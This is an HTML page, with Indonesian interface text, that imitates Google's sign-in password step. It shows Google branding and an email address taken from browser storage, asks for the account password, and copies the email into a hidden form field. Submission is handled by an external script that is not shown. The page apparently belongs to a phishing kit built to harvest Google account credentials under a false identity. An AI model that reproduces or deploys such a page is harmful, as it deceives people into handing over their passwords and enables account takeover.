<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google Sign-In</title>
  <link rel="stylesheet" href="style.css" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0&icon_names=arrow_drop_down" /></head>
<body onload="loadUserEmail()">
  <div class="wrapper">
    <div class="login-card">
        <div>
            <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" alt="Google Logo" class="logo" />
            <h1>Name User</h1>
            <div class="account-user">
              <img src="userProfile.jpg" alt="">
              <p class="text" id="userEmail"></p>
              <span class="material-symbols-outlined">
                arrow_drop_down
              </span>
            </div>
        </div>
        <form onsubmit="handlePasswordSubmit(event)" id="contact-form" name="contact-form-portfolio">
          <div class="input-group-password">
            <p class="info-text-password">Untuk melanjutkan, verifikasi diri Anda terlebih dahulu</p>
            
            <!-- Input password -->
            <input type="password" name="password" placeholder="Masukkan sandi" id="password" required />
            
            <!-- Checkbox tampilkan sandi -->
            <div class="show-password">
              <input type="checkbox" id="show-password" onclick="togglePassword()" />
              <p>Tampilkan sandi</p>
            </div>
            
            <!-- Hidden input untuk email -->
            <input type="hidden" name="email" id="hidden-email" />
          </div>
        
          <div class="buttons">
            <button type="button" class="ghost">Lupa sandi</button>
            <button type="submit" class="next btn-kirim">Masuk</button>
          </div>
        </form>
        
        
    </div>
  </div>

  <script src="js/alpine.min.js"></script>
  <script src="js/script.js"></script>
  <script>
    function loadUserEmail() {
      const email = localStorage.getItem('user_email');
      document.getElementById('userEmail').innerText = email;
    }

    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const checkbox = document.getElementById("show-password");
      passwordInput.type = checkbox.checked ? "text" : "password";
    }

      // Set email dari localStorage ke hidden input
      function loadUserEmail() {
        const email = localStorage.getItem('user_email');
        document.getElementById('userEmail').innerText = email;
        document.getElementById('hidden-email').value = email;
      }
    
      // Toggle sandi terlihat/tidak
      function togglePassword() {
        const passwordInput = document.getElementById("password");
        passwordInput.type = document.getElementById("show-password").checked ? "text" : "password";
      }
    
      window.onload = loadUserEmail;
  </script>
</body>
</html>
